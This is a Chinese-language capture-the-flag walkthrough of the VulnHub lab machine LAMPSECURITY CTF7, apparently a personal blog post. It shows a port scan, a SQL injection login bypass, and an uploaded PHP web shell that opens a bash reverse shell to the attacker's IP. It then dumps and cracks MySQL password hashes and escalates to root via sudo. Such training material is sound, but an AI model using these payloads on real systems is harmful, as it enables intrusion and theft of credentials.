---
title: 'VulnHub_03_LAMPSECURITY: CTF7'
date: 2022-02-19
tags: VulnHub
categories: Technology
---

download：`https://www.vulnhub.com/entry/lampsecurity-ctf7,86/`

找到ip为：`192.168.188.132`

>   nmap参数：
>
>   -Pn ：不检测主机存活

```sh
┌──(root💀kali)-[/home/kali]
└─# nmap -Pn -sV 192.168.188.132                                                                               130 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-19 03:56 EST
Nmap scan report for 192.168.188.132
Host is up (0.00064s latency).
Not shown: 993 filtered ports
PORT      STATE  SERVICE     VERSION
22/tcp    open   ssh         OpenSSH 5.3 (protocol 2.0)
80/tcp    open   http        Apache httpd 2.2.15 ((CentOS))
139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)
901/tcp   open   http        Samba SWAT administration server
5900/tcp  closed vnc
8080/tcp  open   http        Apache httpd 2.2.15 ((CentOS))
10000/tcp open   http        MiniServ 1.610 (Webmin httpd)
MAC Address: 00:0C:29:9D:12:A9 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.98 seconds

```

8080有个web服务，登录框：`' or 1=1 -- .`，直接注入进去

在reading上传shell

```php
<?php
system("bash -i >& /dev/tcp/192.168.188.129/4444 0>&1");
?>  
```



![image-20220219171650551](VulnHub03/image-20220219171650551.png)

但是不知道上传的位置，扫一下：

```sh
┌──(root💀kali)-[/home/kali]
└─# dirb http://192.168.188.132                                                                                255 ⨯

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Feb 19 04:17:38 2022
URL_BASE: http://192.168.188.132/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.188.132/ ----
+ http://192.168.188.132/about (CODE:200|SIZE:4910)                                                                 
==> DIRECTORY: http://192.168.188.132/assets/                                                                       
+ http://192.168.188.132/backups (CODE:301|SIZE:335)                                                                
+ http://192.168.188.132/cgi-bin/ (CODE:403|SIZE:291)                                                               
+ http://192.168.188.132/contact (CODE:200|SIZE:5017)                                                               
==> DIRECTORY: http://192.168.188.132/css/                                                                          
+ http://192.168.188.132/db (CODE:200|SIZE:3904)                                                                    
+ http://192.168.188.132/default (CODE:200|SIZE:6058)                                                               
+ http://192.168.188.132/footer (CODE:200|SIZE:3904)                                                                
+ http://192.168.188.132/header (CODE:200|SIZE:3904)                                                                
==> DIRECTORY: http://192.168.188.132/img/                                                                          
==> DIRECTORY: http://192.168.188.132/inc/                                                                          
+ http://192.168.188.132/index.php (CODE:200|SIZE:6058)                                                             
==> DIRECTORY: http://192.168.188.132/js/                                                                           
+ http://192.168.188.132/newsletter (CODE:200|SIZE:4037)                                                            
+ http://192.168.188.132/phpinfo (CODE:200|SIZE:58773)                                                              
+ http://192.168.188.132/profile (CODE:200|SIZE:3977)              
```

注意到：http://192.168.188.132/assets/

```sh
┌──(kali㉿kali)-[~]
└─$ nc -lp 4444
bash: no job control in this shell
bash-4.1$ ls
ls
0223_cybersecurity_china_us_lieberthal_singer_pdf_english.pdf
1.php
88x31.png
apple-touch-icon-114-precomposed.png
apple-touch-icon-144-precomposed.png
apple-touch-icon-57-precomposed.png
apple-touch-icon-72-precomposed.png
higher-eduction-national-security.pdf
re.php
reverse_php_shell.php
bash-4.1$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
bash-4.1$ mysql -u root
mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 242
Server version: 5.1.66 Source distribution

Copyright (c) 2000, 2012, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| roundcube          |
| website            |
+--------------------+
4 rows in set (0.00 sec)

mysql> use website;
use website;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+-------------------+
| Tables_in_website |
+-------------------+
| contact           |
| documents         |
| hits              |
| log               |
| newsletter        |
| payment           |
| trainings         |
| trainings_x_users |
| users             |
+-------------------+
9 rows in set (0.00 sec)

mysql> select * from users
select * from users
    -> ;
;
+-------------------------------+----------------------------------+----------+---------------------+---------+-----------------+--------------------------------------------------------------------------+
| username                      | password                         | is_admin | last_login          | user_id | realname        | profile                                                                  |
+-------------------------------+----------------------------------+----------+---------------------+---------+-----------------+--------------------------------------------------------------------------+
| brian@localhost.localdomain   | e22f07b17f98e0d9d364584ced0e3c18 |        1 | 2012-12-19 11:30:54 |       3 | Brian Hershel   | Brian is our technical brains behind the operations and a chief trainer. |
| john@localhost.localdomain    | 0d9ff2a4396d6939f80ffe09b1280ee1 |        1 | NULL                |       4 | John Durham     |                                                                          |
| alice@localhost.localdomain   | 2146bf95e8929874fc63d54f50f1d2e3 |        1 | NULL                |       5 | Alice Wonder    |                                                                          |
| ruby@localhost.localdomain    | 9f80ec37f8313728ef3e2f218c79aa23 |        1 | NULL                |       6 | Ruby Spinster   |                                                                          |
| leon@localhost.localdomain    | 5d93ceb70e2bf5daa84ec3d0cd2c731a |        1 | NULL                |       7 | Leon Parnetta   |                                                                          |
| julia@localhost.localdomain   | ed2539fe892d2c52c42a440354e8e3d5 |        1 | NULL                |       8 | Julia Fields    |                                                                          |
| michael@localhost.localdomain | 9c42a1346e333a770904b2a2b37fa7d3 |        0 | NULL                |       9 | Michael Saint   |                                                                          |
| bruce@localhost.localdomain   | 3a24d81c2b9d0d9aaf2f10c6c9757d4e |        0 | NULL                |      10 | Bruce Pottricks |                                                                          |
| neil@localhost.localdomain    | 4773408d5358875b3764db552a29ca61 |        0 | NULL                |      11 | Neil Felstein   |                                                                          |
| charles@localhost.localdomain | b2a97bcecbd9336b98d59d9324dae5cf |        0 | NULL                |      12 | Charles Adams   |                                                                          |
| foo@bar.com                   | 4cb9c8a8048fd02294477fcb1a41191a |        0 | NULL                |      36 |                 |                                                                          |
| test@nowhere.com              | 098f6bcd4621d373cade4e832627b4f6 |        0 | NULL                |     113 |                 |                                                                          |
+-------------------------------+----------------------------------+----------+---------------------+---------+-----------------+--------------------------------------------------------------------------+

```

用一些脚本破解hash，或者在线的网站

```sh
bash-4.1$ su brian
su brian
Password: my2cents

[brian@localhost assets]$ id
id
uid=501(brian) gid=501(brian) groups=501(brian),10(wheel),500(webdev),512(admin) context=system_u:system_r:httpd_t:s0
[brian@localhost assets]$ sudo su
sudo su

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for brian: my2cents

[root@localhost assets]# 
```

